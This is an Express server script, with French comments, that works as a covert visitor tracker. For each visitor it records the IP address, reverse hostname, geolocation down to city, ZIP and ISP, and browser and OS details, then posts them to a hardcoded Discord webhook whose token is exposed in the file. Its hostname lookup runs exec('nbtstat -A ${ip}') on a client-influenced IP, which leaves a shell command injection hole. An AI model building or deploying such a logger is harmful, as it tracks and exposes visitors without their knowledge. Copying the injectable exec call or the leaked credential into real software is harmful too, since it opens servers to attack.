// sv_localisation.js
const express = require("express");
const requestIp = require("request-ip");
const useragent = require("express-useragent");
const dns = require("dns");
const { exec } = require("child_process");
const fetch = require("node-fetch"); // npm install node-fetch@2
const path = require("path");

const app = express();
const PORT = 40120;

// Ton Webhook Discord
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1261431267820441660/IfIo4L3V5Y-fmC8_gkD2x2jnDQPjHi-AUEkMEtOnqCcSkQKt_ksXISnHFYbxvSkr-2ps";

// Middleware
app.use(requestIp.mw());
app.use(useragent.express());
app.use(express.static("public"));

// Vérifier si l'IP est locale
function isPrivateIP(ip) {
  return /^10\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip) || ip === "127.0.0.1";
}

// Récupérer hostname via NetBIOS
function getHostnameNetBIOS(ip, callback) {
  exec(`nbtstat -A ${ip}`, (err, stdout) => {
    if (err) return callback(null);
    const match = stdout.match(/<20>\s+UNIQUE\s+(\S+)/);
    callback(match ? match[1] : null);
  });
}

// Récupérer hostname
function getHostname(ip, callback) {
  getHostnameNetBIOS(ip, (nbtHostname) => {
    if (nbtHostname) return callback(nbtHostname);
    dns.reverse(ip.replace("::ffff:", ""), (err, hostnames) => {
      if (!err && hostnames.length > 0) return callback(hostnames[0]);
      callback("Inconnu");
    });
  });
}

// Localiser l'IP via ip-api.com
async function localiserIP(ip) {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await response.json();
    if (data.status === "success") {
      return {
        pays: data.country,
        region: data.regionName,
        ville: data.city,
        zip: data.zip,
        latitude: data.lat,
        longitude: data.lon,
        isp: data.isp
      };
    }
    return {};
  } catch (e) {
    return {};
  }
}

// Envoyer les infos au webhook Discord
async function sendToDiscord(infos) {
  const content = `
**Nouvelle visite**
IP : ${infos.ip}
Hostname : ${infos.hostname}
Pays : ${infos.localisation.pays || "N/A"}
Région : ${infos.localisation.region || "N/A"}
Ville : ${infos.localisation.ville || "N/A"}
ZIP : ${infos.localisation.zip || "N/A"}
ISP : ${infos.localisation.isp || "N/A"}
Navigateur : ${infos.navigateur}
OS : ${infos.os}
Plateforme : ${infos.plateforme}
Mobile : ${infos.mobile}
Tablette : ${infos.tablette}
Desktop : ${infos.desktop}
`;
  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content })
    });
  } catch (err) {
    console.error("Erreur en envoyant le webhook Discord :", err);
  }
}

// Route principale
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "sv-js", "index.html"));
});

// Middleware pour logger infos
app.use((req, res, next) => {
  const ip = req.clientIp || req.ip;
  const realIp = ip.includes("::ffff:") ? ip.replace("::ffff:", "") : (ip === "::1" ? "127.0.0.1" : ip);
  const ua = req.useragent;

  next(); // on envoie la page immédiatement

  (async () => {
    const hostname = await new Promise(resolve => getHostname(realIp, resolve));
    let localisation = {};
    if (!isPrivateIP(realIp)) {
      localisation = await localiserIP(realIp);
    }

    const infos = {
      ip: realIp,
      hostname,
      localisation,
      navigateur: ua.browser,
      os: ua.os,
      plateforme: ua.platform,
      mobile: ua.isMobile,
      tablette: ua.isTablet,
      desktop: ua.isDesktop,
    };

    console.log("Nouvelle visite :", infos);

    // Envoyer sur Discord
    await sendToDiscord(infos);
  })();
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`✅ Serveur en écoute sur http://localhost:${PORT}`);
});
